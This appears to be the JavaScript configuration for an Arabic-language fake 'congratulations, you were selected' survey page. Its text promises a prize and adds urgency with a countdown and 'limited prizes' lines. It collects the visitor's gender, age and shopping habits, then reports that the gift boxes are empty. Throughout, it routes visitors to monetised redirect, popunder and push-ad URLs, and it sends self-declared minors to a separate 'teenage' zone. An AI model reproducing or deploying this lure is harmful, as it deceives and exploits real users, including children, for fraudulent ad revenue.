window.surveyData = {
    adex: 1,
    adex_alert_urll: 'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',
    adex_warning_urll: 'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',
    ipp_zonex: 4599387,
    ipp_zone_teenagex: 4599749,
    ipp_zone_reversex: 4453914,
    comment: 'Sweep New 6 AR',
    autoexitx: 4254940,
    push_zonex: 4254933,
    reverse_zonex: 4254937,
    popunder_urll: 'https://lehtymns.com/4254936/?var={zone}&ymid={request_var}',
    lead: {
        not_unique: {
            redirect_urll: 'https://lehtymns.com/4254934/?var={zone}&ymid={request_var}',
        },
    },
    title: 'عزيزي المستخدم',
    subtitle: ['نحن نقدم لك فرصة للحصول على مكافأة من رعاة لدينا!', 'للحصول على مكافأتك، ما عليك سوى إكمال استطلاعنا القصير والمجهول.', 'لديك فقط <b>{min} دقيقة و {sec} ثانية</b>، للمشاركة.', ],
    logo_text: 'تهانينا! <br><br>مسابقة ترويجية على <b>{date:today}</b>',
    alert: {
        welcome: "<h1>تهانينا! </h1>\n <p>اليوم <b>{date:today}</b> تم اختيارك عشوائياً للمشاركة في هذا الاختبار. لن يستغرق الأمر سوى دقيقة واحدة وستتاح لك الفرصة للحصول على جائزة واحدة. </p>\n <img src='source/tokens10k.png'>\n <p>كل أسبوع نختار عشوائياً 10 مستخدمين. فقط 10 مستخدمين محظوظين يعيشون في <b>{countryName}</b> لديهم فرصة للحصول على مكافأة! </p>\n <p>لديك فقط <span><b>{min} دقيقة و {sec} ثانية</b></span>، للمشاركة.\n <br>\n عجلوا! هناك عدد محدود من الجوائز! </p>",
        welcomebtn: 'تواصل',
        empty: 'عذرًا، صندوق الهدايا هذا فارغ! لا يزال لديك بعض المحاولات المتبقية. حظا سعيدا!',
        final: '',
    },
    main: {
        type: 'question',
        text: 'ما هو نوع جنسك؟',
        options: [{
            type: 'button',
            text: 'مان',
            audience_id: [61427, 60623],
            action: {
                goto: 'step2',
            },
        }, {
            type: 'button',
            text: 'امرأة',
            audience_id: [61428, 60624],
            action: {
                goto: 'step2',
            },
        }, ],
    },
    step2: {
        type: 'question',
        text: 'كم عمرك؟',
        options: [{
            type: 'button',
            text: 'أقل من 18 سنة',
            audience_id: [61421, 62387, 60625],
            action: {
                redirect_ipp: 'teenage',
                redirect_urll: SmartURL,
                popunder_urll: SmartURL,
            },
        }, {
            type: 'button',
            text: '18-29 سنة',
            audience_id: [62180, 62377, 68427, 78100, 62377, 62382, 68423, 78096],
            action: {
                goto: 'step3',
            },
        }, {
            type: 'button',
            text: '30-49 سنة',
            audience_id: [62181, 62380, 68425, 78097, 62383, 78101],
            action: {
                goto: 'step3',
            },
        }, {
            type: 'button',
            text: '50-80 سنة',
            audience_id: [62182, 62381, 68426, 78098, 62384, 78102],
            action: {
                goto: 'step3',
            },
        }, ],
    },
    step3: {
        type: 'question',
        text: 'كم مرة تتسوق عبر الإنترنت؟',
        options: [{
            type: 'button',
            text: 'كل يوم',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'غالبًا',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'نادرًا',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'أبدا',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, ],
    },
    step4: {
        type: 'question',
        text: 'هل سبق لك أن استخدمت بطاقات هدية/قسائم لمشترياتك؟',
        options: [{
            type: 'button',
            text: 'نعم',
            audience_id: 0,
            action: {
                goto: 'step5',
            },
        }, {
            type: 'button',
            text: 'لا',
            audience_id: 0,
            action: {
                goto: 'step5',
            },
        }, ],
    },
    step5: {
        type: 'question',
        text: 'هل أنت مهتم بالحصول على أكبر الخصومات والهدايا؟',
        options: [{
            type: 'button',
            text: 'نعم',
            audience_id: 0,
            action: {
                goto: 'step6',
            },
        }, {
            type: 'button',
            text: 'لا',
            audience_id: 0,
            action: {
                goto: 'step6',
            },
        }, ],
    },
    step6: {
        type: 'question',
        text: 'ما الذي تفضله؟',
        options: [{
            type: 'button',
            text: 'بطاقة هدايا',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, {
            type: 'button',
            text: 'خصم لمرة واحدة',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, {
            type: 'button',
            text: 'بطاقة خصم',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, ],
    },
    final: {
        type: 'thank_you',
        boxes: 1,
        timeout: 40,
        timeout_url: SmartURL,
        timeout_conversion: 1,
        content: `<div class="final">
                        <div class="final__step1">
                            <p>شكرا لك على إجراء اختبارنا. </p>
                            <p>الآن لديك فرصة للحصول على مكافأة. </p>
                            <p>كل ما عليك القيام به هو اختيار صندوق الهدايا المناسب. </p>
                        </div>
                        <div class="final__step2">\
                            <p>عفوا! </p>
                            <p>الصناديق فارغة. </p>
                            <p>لا يزال لديك فرصة للحصول على مكافأة من شركائنا. </p>
                            <p>هذا العرض متاح فقط لمدة 7 دقائق القادمة! </p>
                        </div>
                        <div class="instructions">
                            <h2 class="instructions__header">ابحث عن مكافأة! </h2>
                            <div class="instructions__text">
                            <span class=bounce>↓</span>
                            <h3 class="instructions__text-1">كل ما عليك القيام به هو اختيار <b>صندوق الهدايا الصحيح</b>. </h3>
                            <h3 class="instructions__text-2">انقر فوق الزر «متابعة» وأكمل الخطوات النهائية للحصول على فرصة للحصول على مكافأة! </h3>
                            <span class=bounce>↓</span>
                        </div>
                    </div>
                </div>`,
        progress_title: 'تقدير النتائج...',
        progress_texts: ['انتظر... التحقق من الإجابات', 'انتظر... عد درجاتك'],
        progress_content: '',
        options: [{
            type: 'button',
            text: 'استمرار',
            audience_id: 61426,
            action: {
                conversion: 1,
                redirect_urll: SmartURL,
            },
        }, ],
    },
};